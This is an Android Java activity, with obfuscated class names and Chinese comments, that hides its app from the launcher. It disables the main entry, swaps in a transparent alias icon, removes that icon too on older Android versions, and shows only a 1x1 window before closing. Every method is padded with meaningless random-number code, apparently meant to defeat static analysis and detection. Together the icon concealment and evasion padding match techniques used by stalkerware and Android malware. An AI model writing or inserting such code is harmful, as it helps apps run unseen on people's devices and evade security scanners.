package ibx.qpt.fosg;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（PTJY），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class TBOP extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_cDbhDksYSuNiNoAleu = new java.lang.Object();
        int i_DeGdpALfTlHD = arr_cDbhDksYSuNiNoAleu.hashCode();
        int j_QlqtVkKxTHRsZbFOrW = new java.util.Random().nextInt(100);
        int tmp_XQkrf = (i_DeGdpALfTlHD ^ j_QlqtVkKxTHRsZbFOrW) & 0x7FFFFFFF;
        if (tmp_XQkrf == 24 && i_DeGdpALfTlHD < 31) {
            arr_cDbhDksYSuNiNoAleu.toString();
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(TBOP.this, PTJY.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(TBOP.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        long arr_mKezMEcYHsR = java.lang.System.nanoTime();
        int i_SIaTKddfKCxeQXaKFU = new java.util.Random().nextInt(1000);
        boolean j_vDQbqJLO = (arr_mKezMEcYHsR % (i_SIaTKddfKCxeQXaKFU + 37)) > 90;
        double tmp_VFcReOWJgWrbXrDnM = j_vDQbqJLO ? java.lang.Math.sqrt(i_SIaTKddfKCxeQXaKFU) : java.lang.Math.pow(i_SIaTKddfKCxeQXaKFU, 4);
        if (tmp_VFcReOWJgWrbXrDnM < 0.0) {
            java.lang.System.out.println(tmp_VFcReOWJgWrbXrDnM);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        int process_rPvEmyC = new java.util.Random().nextInt(50);
        int stack_MFytoviRphNSFZQoa = (process_rPvEmyC > 91) ? 1 : ((process_rPvEmyC > 91) ? 21 : ((process_rPvEmyC > 85) ? 63 : 26));
        int i_HxGsa = stack_MFytoviRphNSFZQoa * process_rPvEmyC;
        if (i_HxGsa > 61) {
            java.lang.System.arraycopy(new int[] { i_HxGsa }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onalOQSVmpd = java.util.UUID.randomUUID().toString();
        int ckuyZcyGgbRTKMADF = onalOQSVmpd.length();
        char pmh_ucyeyCjKrNwM = onalOQSVmpd.charAt(new java.util.Random().nextInt(ckuyZcyGgbRTKMADF));
        boolean dimaGTVxwykwnCeiCmwl = (pmh_ucyeyCjKrNwM == 'z');
        if (dimaGTVxwykwnCeiCmwl && ckuyZcyGgbRTKMADF < 70) {
            onalOQSVmpd.substring(23, 30);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
